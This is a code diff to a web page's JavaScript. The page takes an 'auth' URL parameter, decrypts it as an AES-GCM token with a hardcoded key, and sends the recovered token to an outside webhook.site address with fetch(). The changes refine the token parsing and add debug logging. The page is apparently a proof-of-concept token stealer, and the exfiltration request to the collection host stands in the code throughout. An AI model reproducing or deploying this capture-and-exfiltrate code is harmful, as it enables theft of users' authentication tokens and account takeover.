@@ -20,6 +20,7 @@
             font-family: 'Courier New', monospace;
             white-space: pre-wrap;
             min-height: 200px;
+            font-size: 12px;
         }
         h1 {
             color: #333;
@@ -60,23 +61,33 @@
         // Decrypt token function
         async function decryptToken(aesKey, ivStr, encrypted) {
             try {
-                // Reverse the replacement (*c4l* to /)
+                // First, replace *c4l* with /
                 const combined = encrypted.replace(/\*c4l\*/g, "/");
-                log("After replacing *c4l* with /: " + combined);
+                log("After replacing *c4l* with /:");
+                log(combined.substring(0, 100) + "...");
                 
-                // Split by space to get ciphertext and tag
-                const parts = combined.split("%20");
-                if (parts.length !== 2) {
-                    throw new Error("Invalid encrypted format: expected ciphertext and tag separated by space");
+                // Find the last space - this separates ciphertext from tag
+                const lastSpaceIndex = combined.lastIndexOf(" ");
+                if (lastSpaceIndex === -1) {
+                    throw new Error("Invalid encrypted format: no space found to separate ciphertext and tag");
                 }
                 
-                const [encCt, encTag] = parts;
-                log("Ciphertext (base64): " + encCt);
-                log("Tag (base64): " + encTag);
+                // Split into ciphertext and tag
+                const encCt = combined.substring(0, lastSpaceIndex);
+                const encTag = combined.substring(lastSpaceIndex + 1);
+                
+                log("\n=== Separated Components ===");
+                log("Ciphertext length: " + encCt.length);
+                log("Ciphertext (first 100 chars): " + encCt.substring(0, 100) + "...");
+                log("Tag: " + encTag);
                 
                 // Base64 decode
                 const ciphertext = base64ToArrayBuffer(encCt);
                 const tag = base64ToArrayBuffer(encTag);
+                
+                log("\nDecoded lengths:");
+                log("Ciphertext bytes: " + ciphertext.byteLength);
+                log("Tag bytes: " + tag.byteLength);
                 
                 // Combine ciphertext and tag
                 const ctTag = new Uint8Array(ciphertext.byteLength + tag.byteLength);
@@ -109,7 +120,7 @@
                 
                 return arrayBufferToString(plaintext);
             } catch (error) {
-                log("Decryption error: " + error.message);
+                log("\nDecryption error: " + error.message);
                 throw error;
             }
         }
@@ -120,11 +131,18 @@
             const auth = params.get("auth");
 
             if (auth) {
-                log("Auth parameter detected: " + auth);
+                log("=== Original Auth Parameter ===");
+                log(auth.substring(0, 100) + "...\n");
                 
                 // Remove first character
                 let modifiedAuth = auth.substring(1);
-                log("After removing first char: " + modifiedAuth);
+                log("=== After Removing First Char ===");
+                log(modifiedAuth.substring(0, 100) + "...\n");
+                
+                // Replace %20 with space
+                modifiedAuth = modifiedAuth.replace(/%20/g, " ");
+                log("=== After Replacing %20 with Space ===");
+                log(modifiedAuth.substring(0, 100) + "...\n");
                 
                 // Decrypt the token
                 const aesKey = "ad5381fdfee6c65bab7789c1218b0e9b";
@@ -132,22 +150,25 @@
                 
                 try {
                     const decryptedToken = await decryptToken(aesKey, ivStr, modifiedAuth);
-                    log("Decrypted token: " + decryptedToken);
+                    log("\n=== DECRYPTED TOKEN ===");
+                    log(decryptedToken);
                     
                     // Construct webhook URL with decrypted token
                     const webhookUrl = `https://webhook.site/804f337b-de96-452c-b679-d7988577487b/c=${encodeURIComponent(decryptedToken)}`;
-                    log("Sending request to webhook...");
+                    log("\n=== Sending to Webhook ===");
                     log("URL: " + webhookUrl);
                     
                     // Send request
                     const response = await fetch(webhookUrl);
-                    log("Request sent successfully!");
+                    log("\nRequest sent successfully!");
                     log("Status: " + response.status);
                     
                     const data = await response.text();
                     log("Response: " + data);
                 } catch (error) {
-                    log("Error: " + error.message);
+                    log("\n=== ERROR ===");
+                    log(error.message);
+                    log(error.stack);
                 }
             } else {
                 log("No auth parameter present.");
